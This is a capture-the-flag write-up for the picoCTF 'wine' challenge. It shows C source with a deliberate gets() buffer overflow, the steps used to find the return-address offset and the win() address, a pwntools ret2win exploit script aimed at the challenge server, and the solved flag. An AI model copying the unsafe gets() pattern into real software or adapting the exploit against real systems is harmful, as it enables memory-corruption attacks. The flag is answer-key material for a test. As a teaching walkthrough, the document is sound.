# wine
> Write-up author: vreshco
## DESCRIPTION:
Challenge best paired with wine. I love windows. Checkout my exe running on a linux box. You can view source here. And connect with it using nc saturn.picoctf.net 57867
## HINT:
- Gets is dangerous. Even on windows.
## STEPS:
1. Given a 32 bit PE file.

![image](https://user-images.githubusercontent.com/70703371/224527642-e6e86e7d-d4ff-4dbd-9dc3-a7577baf8eea.png)


2. Let's analyze the source-code given.

> SOURCE-CODE

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void win(){
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("flag.txt not found in current directory.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

void vuln()
{
  printf("Give me a string!\n");
  char buf[128];
  gets(buf);
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}

```

3. Based from it we know that we can overflow the buffer of **buf** variable because of the `gets()` function.
4. With this we can control the **EIP** to return to the `win()` function which opens up a **flag.txt** file.
5. The pwn concept is simple ret2win, let's get started by finding the **EIP** offset using `winedbg`.

> WINEDBG -> sending 1024 bytes

![image](https://user-images.githubusercontent.com/70703371/224530940-5f0b997f-475a-44d3-9326-66cdf356d134.png)


![image](https://user-images.githubusercontent.com/70703371/224530971-4ab6c8be-2fc3-4003-8df6-643d1388b148.png)


6. Successfully overwrote the **EBP** and we can use the leaked **EIP** bytes to get it's offset.

> RESULT -> 140

![image](https://user-images.githubusercontent.com/70703371/224531002-0cc9e68d-d66b-464d-8a60-6e68f31113a5.png)


7. Next we need to find the address of the win function using gdb

> RESULT -> 0x401530

![image](https://user-images.githubusercontent.com/70703371/224531038-dec755dc-3199-4671-b285-476714e4199f.png)


8. Let's craft our script then using pwntools.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

sh = remote('saturn.picoctf.net', 57867)

padding = 140

context.log_level = 'debug'

p = asm('nop') * padding
p += pack(0x401530) # 0x401530 win func
sh.sendline(p)

sh.interactive()

```

9. Run the script

> RESULT

![image](https://user-images.githubusercontent.com/70703371/224531676-563dc5e6-6e13-4e73-86e0-3fd083344c6c.png)


10. Got the flag!

## FLAG

```
picoCTF{Un_v3rr3_d3_v1n_8ab00bc8}
```
